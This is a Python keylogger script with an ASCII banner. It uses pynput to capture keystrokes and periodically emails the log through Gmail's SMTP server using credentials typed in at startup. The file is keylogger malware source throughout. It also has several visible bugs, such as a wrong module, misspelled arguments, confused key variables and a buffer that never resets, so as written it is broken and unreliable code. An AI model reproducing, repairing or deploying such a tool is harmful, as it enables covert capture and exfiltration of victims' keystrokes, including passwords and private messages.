import getpass, smtpd, ssl
from pynput.keyboard import Key, Listener
#list of imports 

#code title 
print('''
 _______   __    __  .___  ___. .___  ___. ____    ____    __  ___  ___________    ____ 
|       \ |  |  |  | |   \/   | |   \/   | \   \  /   /   |  |/  / |   ____\   \  /   / 
|  .--.  ||  |  |  | |  \  /  | |  \  /  |  \   \/   /    |  '  /  |  |__   \   \/   /  
|  |  |  ||  |  |  | |  |\/|  | |  |\/|  |   \_    _/     |    <   |   __|   \_    _/   
|  '--'  ||  `--'  | |  |  |  | |  |  |  |     |  |       |  .  \  |  |____    |  |     
|_______/  \______/  |__|  |__| |__|  |__|     |__|  _____|__|\__\ |_______|   |__|     
                                                    |______|                            ''')


#email dump
emailAddr = input('Enter Email: ')
key = getpass.getpass(promt='Email Password: ', stream = None)
server = smtpd.SMTP_SSL('smtp.gmail.com', 465)
server.login(emailAddr, key)

#logger variables 
key_log = ''
word = ''
character_lim = 100

#key logger function 
def on_press(key):
    #global version 
    global key_log 
    global word
    global character_lim
    global emailAddr
    #filters for certain keys 
    if key == Key.space or Key == Key.enter or Key == Key.tab:
        word += ''
        key_log += word
        word =''
        if len(key_log) >= character_lim:
            email_log()
            key_log 
    elif Key == Key.shift_r or Key == Key.shift_l:
        return 
    elif Key == Key.backspace:
        word = word[:-1]
    elif Key == Key.esc:
        return False
    #sets word variable equal to char 
    else:
        char = f'{Key}'
        char = char[1:-1]
        word += char

#email send function 
def email_log():
    server.senmail(
        emailAddr,
        emailAddr,
        key_log
    )

with Listener(on_press=on_press) as listener:
    listener.join()
